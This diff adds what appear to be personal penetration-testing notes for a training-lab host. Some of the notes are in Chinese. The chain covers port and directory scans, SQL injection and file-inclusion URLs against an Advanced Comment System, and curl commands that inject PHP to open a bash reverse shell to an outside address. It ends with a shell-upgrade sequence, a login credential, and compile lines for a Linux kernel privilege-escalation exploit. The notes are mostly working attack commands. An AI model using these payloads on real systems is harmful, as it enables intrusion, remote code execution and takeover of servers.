@@ -1,0 +1,84 @@
+nmap -sC -sV -Pn 10.11.1.8 >nmap.txt
+nmap -p- 10.11.1.8 > nmapall.txt
+
+
+binwalk merlin.jpg
+binwalk -Me merlin.jpg
+gobuster dir  -u http://10.11.1.8  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobuster.txt
+gobuster dir  -u http://10.11.1.8/cgi-bin/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobustercgi.txt
+gobuster dir  -u http://10.11.1.8/internal/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusterinternal.txt
+gobuster dir  -u http://10.11.1.8/manual/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobustermanual.txt
+
+
+
+1.nmap掃描發現80端口,針對80端口對gobuster掃描,發現internal及manual路徑,並嘗試打開
+2.發現internal是Advanced comment system服務,搜索exploit,發現SQL Injection漏洞
+3.嘗試LFI及RFI都無法使用,找到網路上gitgub文章https://github.com/backlion/oscp-7
+4.remote code execution指令,必須要443端口才可以
+curl -s --data "<?system('/bin/bash -i >& /dev/tcp/192.168.119.134/443 0>&1');?>" 'http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
+5.取得reverse shell後,可以看到config.php內有Mysql的帳密從而登入
+6.使用LinEnum.sh發現centos版本，根據版本查找到內核提權漏洞,9545
+7.在本地kali做compile要注意事項
+centos版本是i386是32位元,所以compile要指定-m32
+8.出現報錯error while loading shared libraries: requires glibc 2.5 or later dynamic linker
+查詢後發現需要增加--hash-style=both
+9.gcc -m32 -Wl,--hash-style=both 9542.c -o linux-sendpage
+
+
+
+
+
+http://10.11.1.8/internal/advanced_comment_system/admin.php?pw=admin&page=/internal/index.php%27%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x71717a6b71,0x67424663534f77556d44746a59686f78427354754268636b5466486249616b724d716e4869634758,0x7171626a71),NULL--%20SkrU&del=2
+http://10.11.1.8/internal/advanced_comment_system/admin.php?pw=fgfdg
+http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=/etc/passwd
+http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path%3D%2Fetc%2Fpasswd
+http://10.11.1.8/internal/advanced_comment_system/admin.php?pw=admin&page=%2Fryu%2Fsample.php&submit=go
+http://www.example.com//advanced_comment_system/admin.php?ACS_path=config.php
+http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=/etc/passwd
+http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=php://input%00
+/advanced_comment_system/index.php?ACS_path=[shell.txt?]
+
+curl -s --data "<?system('bash -i >& /dev/tcp/192.168.119.134/4444 0>&1');?>" 'http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
+
+
+
+
+http://10.11.1.8/internal/advanced_comment_system/admin.php?pw=admin&page=../../../../../etc/passwd
+
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 ryujin@10.11.1.8
+
+
+qqzkqgBFcSOwUmDtjYhoxBsTuBhckTfHbIakrMqnHicGXqqbjq
+
+12:13:09 pm
+ssh ryujin@10.11.1.8
+
+holaz
+
+
+python -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+ctrl+z
+stty raw -echo && fg
+enter
+stty rows 54 && stty columns 235 && export TERM=xterm
+
+
+Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
+mysql  Ver 14.7 Distrib 4.1.22, for redhat-linux-gnu (i686) using readline 4.3
+Linux version 2.6.9-89.EL (mockbuild@builder10.centos.org)
+(gcc version 3.4.6 20060404
+(Red Hat 3.4.6-11)) #1 Mon Jun 22 12:19:40 EDT 2009
+
+
+gcc -o 9542 9542.c && ./0x82-CVE-2009-2698
+
+gcc --hash-style=both -m32 -Wall -o 9542 9542.c
+
+
+gcc -o 9542 9542.c
+
+
+gcc -Wall -m32,--hash-style=both -o linux-sendpage 9545.c
+gcc -m32 -Wl,--hash-style=both 9542.c -o linux-sendpage
+
